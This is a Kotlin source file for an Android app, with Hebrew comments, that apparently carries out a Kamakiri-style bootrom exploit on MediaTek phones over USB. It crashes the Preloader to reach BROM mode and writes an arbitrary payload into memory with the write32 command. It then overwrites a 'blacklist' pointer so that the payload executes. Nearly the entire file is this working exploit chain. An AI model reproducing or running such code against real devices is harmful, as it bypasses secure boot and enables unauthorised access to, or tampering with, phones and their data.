package com.example.mtkusbtool

import android.hardware.usb.UsbConstants
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbEndpoint
import android.hardware.usb.UsbManager
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.Locale

object MtkBromConnection {

    // קריסת Preloader כדי לעבור ל-BROM
    fun crashPreloader(usbManager: UsbManager, device: UsbDevice): Boolean {
        val connection = usbManager.openDevice(device) ?: return false
        var epOut: UsbEndpoint? = null
        for (i in 0 until device.interfaceCount) {
            val usbInterface = device.getInterface(i)
            if (connection.claimInterface(usbInterface, true)) {
                for (j in 0 until usbInterface.endpointCount) {
                    val ep = usbInterface.getEndpoint(j)
                    if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK && ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
                }
                if (epOut != null) break
            }
        }
        if (epOut == null) { connection.close(); return false }

        try {
            connection.bulkTransfer(epOut, byteArrayOf(0xA1.toByte()), 1, 100)
            connection.bulkTransfer(epOut, byteArrayOf(0xD7.toByte()), 1, 100)
            connection.bulkTransfer(epOut, byteArrayOf(0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte()), 4, 100)
            Thread.sleep(50)
        } catch (e: Exception) {} finally { connection.close() }
        return true
    }

    // כתיבת 4 בייטים לזיכרון (0xD4)
    private fun write32(connection: android.hardware.usb.UsbDeviceConnection, epOut: UsbEndpoint, epIn: UsbEndpoint, addr: Int, values: IntArray): Boolean {
        if (connection.bulkTransfer(epOut, byteArrayOf(0xD4.toByte()), 1, 2000) < 0) return false
        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(addr).array()
        if (connection.bulkTransfer(epOut, addrBytes, 4, 2000) < 0) return false
        val sizeBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(values.size).array()
        if (connection.bulkTransfer(epOut, sizeBytes, 4, 2000) < 0) return false
        
        val ack = ByteArray(1)
        connection.bulkTransfer(epIn, ack, 1, 2000)
        
        for (v in values) {
            val vBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(v).array()
            if (connection.bulkTransfer(epOut, vBytes, 4, 2000) < 0) return false
        }
        return true
    }

    // הרצת ה-Payload
    fun runKamakiriViaWrite32(
        usbManager: UsbManager,
        device: UsbDevice,
        payloadBytes: ByteArray,
        onProgress: (String) -> Unit
    ): String {
        // 1. קריסה ראשונית
        onProgress("קורס Preloader...")
        crashPreloader(usbManager, device)
        
        // המתנה ל-BROM
        onProgress("ממתין ל-BROM (0x0003)...")
        var foundBrom: UsbDevice? = null
        for (i in 0 until 100) {
            foundBrom = usbManager.deviceList.values.firstOrNull { it.vendorId == 0x0E8D && it.productId == 0x0003 }
            if (foundBrom != null) break
            Thread.sleep(100)
        }
        
        if (foundBrom == null) {
            return "שגיאה: לא הצלחנו להגיע ל-BROM."
        }
        
        // שמירה במשתנה לא-נוללי
        val bd: UsbDevice = foundBrom
        onProgress("מצאנו BROM! מתחיל כתיבת Payload...")

        val connection = usbManager.openDevice(bd) ?: return "שגיאה: פתיחת חיבור נכשלה."

        var epIn: UsbEndpoint? = null
        var epOut: UsbEndpoint? = null
        for (i in 0 until bd.interfaceCount) {
            val usbInterface = bd.getInterface(i)
            if (connection.claimInterface(usbInterface, true)) {
                for (j in 0 until usbInterface.endpointCount) {
                    val ep = usbInterface.getEndpoint(j)
                    if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK) {
                        if (ep.direction == UsbConstants.USB_DIR_IN) epIn = ep
                        else if (ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
                    }
                }
                if (epIn != null && epOut != null) break
            }
        }

        if (epIn == null || epOut == null) { connection.close(); return "שגיאה: לא נמצאו נקודות קצה." }

        // 2. שליחת לחיצת יד
        onProgress("שולח לחיצת יד (0xA0)...")
        connection.bulkTransfer(epOut, byteArrayOf(0xA0.toByte()), 1, 1000)
        val ack = ByteArray(1)
        connection.bulkTransfer(epIn, ack, 1, 1000)

        // 3. כתיבת ה-Payload
        onProgress("כותב Payload (${payloadBytes.size} בייט)...")
        val payloadAddr = 0x100A00
        var offset = 0
        while (offset < payloadBytes.size) {
            val chunk = payloadBytes.copyOfRange(offset, minOf(offset + 4, payloadBytes.size))
            val value = ByteBuffer.wrap(chunk + ByteArray(4 - chunk.size)).order(ByteOrder.BIG_ENDIAN).int
            if (!write32(connection, epOut, epIn, payloadAddr + offset, intArrayOf(value))) {
                connection.close()
                return "שגיאה בכתיבת Payload ב-offset $offset"
            }
            offset += 4
            if (offset % 100 == 0) onProgress("התקדמות: ${(offset * 100) / payloadBytes.size}%")
        }

        // 4. הרצת ה-Payload
        onProgress("מריץ Payload...")
        val blacklistAddr = 0x102868
        if (!write32(connection, epOut, epIn, blacklistAddr, intArrayOf(payloadAddr))) {
            connection.close()
            return "שגיאה בהרצת Payload."
        }

        connection.close()
        return "הצלחה! ה-Payload נכתב והורץ. החיבור נשאר חי."
    }
}
